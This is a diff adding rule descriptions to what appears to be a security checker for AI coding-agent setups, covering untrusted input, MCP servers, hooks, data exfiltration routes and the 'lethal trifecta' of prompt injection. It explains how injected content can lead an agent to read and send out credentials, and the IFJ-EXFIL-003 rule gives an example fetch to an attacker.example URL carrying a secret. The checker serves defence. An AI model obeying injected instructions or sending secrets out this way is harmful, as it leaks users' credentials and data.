@@ -243,6 +243,160 @@ The file's permission bits let other users on this machine read it, not only you
 Family `secret`, default level `warn`.
 
 
+# Untrusted input
+
+## IFJ-INPUT-001: Web content comes in without approval
+
+The agent's web tools run without approval, so any page an injected instruction
+names comes into its context, and with it the next instruction.
+
+Family `input`, default level `warn`.
+
+Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>
+
+## IFJ-INPUT-002: An MCP server brings in content others write
+
+An MCP server feeds the agent content that other people write: GitHub issues and
+pull requests, web pages, chat messages, error reports. Any of it can carry
+instructions the agent may follow.
+
+Family `input`, default level `warn`.
+
+Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>
+
+## IFJ-INPUT-003: The repository can start code in the agent
+
+Hooks and MCP servers configured *in the repository* (``.claude/settings.json``,
+``.mcp.json``) run on your machine with your access when the agent starts there. A
+cloned repository, or a pull request that edits these files, can run its own code
+without the agent being injected at all.
+
+Family `input`, default level `warn`.
+
+Sources: <https://code.claude.com/docs/en/mcp>, <https://code.claude.com/docs/en/hooks>
+
+
+# Ways out
+
+## IFJ-EXFIL-001: Shell commands can reach any host
+
+Shell commands run outside any sandbox, so ``curl``, ``git push`` or a script can
+send data to any host on the internet.
+
+Family `exfil`, default level `warn`.
+
+Sources: <https://code.claude.com/docs/en/sandboxing>
+
+## IFJ-EXFIL-002: The sandbox lets data out to hosts that accept uploads
+
+The sandbox's network allowlist includes hosts anyone can upload to: code hosts,
+paste sites, object storage, webhooks, or a wildcard. A sandboxed command can
+still push a secret to a repository or bucket the attacker controls.
+
+Family `exfil`, default level `warn`.
+
+Sources: <https://code.claude.com/docs/en/sandboxing>
+
+## IFJ-EXFIL-003: Web fetches can carry data out without approval
+
+The agent's web fetch tool runs without approval. Data leaves in the URL: a fetch of
+``https://attacker.example/?k=<secret>`` is an upload.
+
+Family `exfil`, default level `warn`.
+
+Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>
+
+## IFJ-EXFIL-004: An MCP server can send data out
+
+An MCP server can write somewhere others can read: open an issue or a comment,
+post a message, call an API, load a URL. That is a way out for anything the agent
+has read.
+
+Family `exfil`, default level `warn`.
+
+Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>
+
+
+# MCP servers
+
+## IFJ-MCP-001: A local MCP server runs with your full access
+
+A local (stdio) MCP server is a program on your machine with your rights. The
+agent's sandbox does not apply to it, and the agent's rules do not see what it does
+with files or the network.
+
+Family `mcp`, default level `warn`.
+
+Sources: <https://code.claude.com/docs/en/sandboxing>
+
+## IFJ-MCP-002: An MCP server is downloaded unpinned at every start
+
+The server is started through ``npx``, ``uvx`` or ``docker run`` without a fixed
+version (or with ``@latest``), so whatever the package's newest release contains
+runs with your access the next time the agent starts. A hijacked package is a
+supply-chain attack that needs no injection.
+
+Family `mcp`, default level `warn`.
+
+## IFJ-MCP-003: MCP tools run without approval
+
+The server's tools run without asking (an allow rule names the server, or the
+permission mode skips prompts). Whatever the server can do, an injected instruction
+can make it do at once.
+
+Family `mcp`, default level `warn`.
+
+Sources: <https://code.claude.com/docs/en/mcp>
+
+
+# Hooks
+
+## IFJ-HOOK-001: Hooks and helpers run outside the sandbox
+
+Hooks (commands the agent runs on events) and helpers such as ``apiKeyHelper`` run
+with your full access, outside the sandbox. They are yours to review: a hook that
+passes tool input to a shell can turn an injected tool call into a command.
+
+Family `hook`, default level `warn`.
+
+Sources: <https://code.claude.com/docs/en/hooks>, <https://code.claude.com/docs/en/sandboxing>
+
+
+# The lethal trifecta
+
+## IFJ-TRIFECTA-001: Lethal trifecta, and nobody has to approve it
+
+The agent can reach private data, takes in content an attacker can write, and can
+send data out, and no human stands in front of any of the three. One poisoned
+README, issue or web page can make it read a credential and send it away. Close one
+leg: deny the credentials (in the sandbox, not only in rules), or remove the way out
+(sandbox network allowlist, no auto-approved upload tools).
+
+Family `trifecta`, default level `deny`.
+
+Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>
+
+## IFJ-TRIFECTA-002: Lethal trifecta behind an approval
+
+All three legs are open, but a human must approve at least one step. That holds
+only while every prompt is read; an approved ``curl`` or ``git push`` after reading a
+file is all an injection needs.
+
+Family `trifecta`, default level `deny` (never more than a warning).
+
+Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>
+
+## IFJ-TRIFECTA-003: Two legs of the trifecta
+
+Two of the three legs are open. Adding one MCP server, one allow rule or one
+credential file completes the trifecta; check again after changing the agent's
+setup.
+
+Family `trifecta`, default level `deny` (never more than a warning).
+
+Sources: <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/>
+
+
 # Configuration
 
 ## IFJ-CONFIG-001: Agent configuration could not be read
